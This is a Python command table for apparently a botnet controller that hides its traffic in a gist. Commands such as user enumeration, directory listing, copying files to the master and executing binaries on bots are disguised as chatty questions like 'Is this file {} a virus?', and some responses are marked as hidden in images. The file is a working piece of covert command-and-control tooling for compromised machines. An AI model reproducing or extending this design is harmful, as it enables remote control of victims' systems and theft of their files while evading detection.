# todo
COMMANDS = {
	"1": {
		"name": "GET_NUMBER_OF_BOTS",
		"description": "Return number of bots",
		"args": [],
		"func": "update_and_print_bots",
	},
	"2": {
		"name": "GET_ALL_USERS",
		"description": "Get all users in the bot's system",
		"args": [],
		"question": "What are some weird names?",
		"func": "send_command",
		"response": ":ImageSecret"
	},
	"2l": {
		"name": "GET_ALL_LOGGED_IN_USERS",
		"description": "Get all logged in users in the bot's system",
		"args": [],
		"question": "What are some weirder names?",
		"func": "send_command",
		"response": "Some wierder names i have seen are:\n {}"
	},
	"3": {
		"name": "GET_BOTS_USER",
		"description": "Get information about the bot user",
		"args": [],
		"question": "What is your favoirite nickname?",
		"func": "send_command",
		"response": "My favourite nickname is {}"
	},
	"4": {
		"name": "LIST_DIRECTORY_CONTENT",
		"description": "List content of specified directory with permissions",
		"args": [
			"Path to directory you wish to list contents of:"
		],
		"question": "Is it okay if i have permissions 777 for directory {}?",
		"func": "send_command",
		"response": ":ImageSecret"
	},
	"5": {
		"name": "LIST_DIRECTORY_CONTENT_NAMES_ONLY",
		"description": "List content of specified directory only with item names",
		"args": [
			"Path to directory you wish to list contents of:"
		],
		"question": "Is it okay if i have permissions 000 for directory {}?",
		"func": "send_command",
		"response": ":ImageSecret"
	},
	"6": {
		"name": "COPY_FILE_TO_MASTER",
		"description": "Copy file from bot to the master(controller)",
		"args": [
			"Path to file you want to copy:"
		],
		"question": "Is this file {} a virus?",
		"func": "send_command",
		"response": ":ImageSecret"
	},
	"7": {
		"name": "EXECUTE_BINARY",
		"description": "Execute binary on the bots",
		"args": [
			"Path to binary:",
			"Arguments:"
		],
		"question": "When browsing my processes i found this {} binary it is running with these parameters {}. Is it okay or should i be worried?",
		"func": "send_command",
		"response": ":ImageSecret"
	},
	"8": {
		"name": "GET_SYSTEM_INFO",
		"description": "Get information about the system os",
		"question": "What is your favourite os?",
		"args": [],
		"func": "send_command",
		"response": "My favourite os is {}"
	},
	"9": {
		"name": "GET_SYSTEM_INFO_DETAILED",
		"description": "Get detailed information about the system os",
		"question": "What is your favourite os version?",
		"args": [],
		"func": "send_command",
		"response": ":ImageSecret"
	},
	"10": {
		"name": "QUIT",
		"description": "Quit ",
		"args": [
			"Do you want to delete the gist (y/n - defaults to no)?"
		],
		"func": "stop"
	}
}

BOT_IDLETIME = 10